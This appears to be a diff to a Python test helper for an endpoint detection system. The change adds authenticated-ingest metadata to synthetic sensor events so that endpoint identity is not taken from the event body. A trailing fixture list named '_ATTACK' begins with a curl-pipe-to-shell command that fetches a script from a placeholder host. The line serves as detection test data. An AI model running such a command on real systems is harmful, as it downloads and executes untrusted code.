@@ -436,7 +436,16 @@ def _sensor_ev(cmd, image, pid, endpoint="ep_camp1", host="lab-linux-01"):
             "image_path": image, "command_line": cmd, "user": "root",
             "collection_method": "PROC_POLL",
             "parent_lookup_state": "OBSERVED", "parent_image": "sshd",
-            "endpoint_id": endpoint, "hostname": host}
+            "endpoint_id": endpoint, "hostname": host,
+            # G-29/G-30 · the endpoint identity is established by the
+            # AUTHENTICATED ingest boundary (exactly as
+            # `canonical_bridge` does on the real path), never by the
+            # `endpoint_id` field sitting in the event body.
+            "_authenticated_ingest": {
+                "trust_state": "AUTHENTICATED",
+                "source_kind": "REAL_SENSOR_DERIVED",
+                "sensor_version": "1.4.2",
+                "authenticated_endpoint_id": endpoint}}
 
 
 _ATTACK = [("/bin/bash -c curl -s http://x/a.sh | sh", "/usr/bin/bash", 31),
